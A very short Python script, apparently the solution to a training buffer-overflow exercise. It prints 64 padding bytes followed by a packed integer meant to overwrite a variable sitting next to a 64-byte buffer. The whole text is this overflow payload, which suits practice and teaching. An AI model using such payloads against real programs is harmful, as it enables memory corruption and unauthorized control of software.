import struct

padding = "A" * 64

# Value that will be written to the target variable
value = struct.pack("I", 64)

print(padding + value)
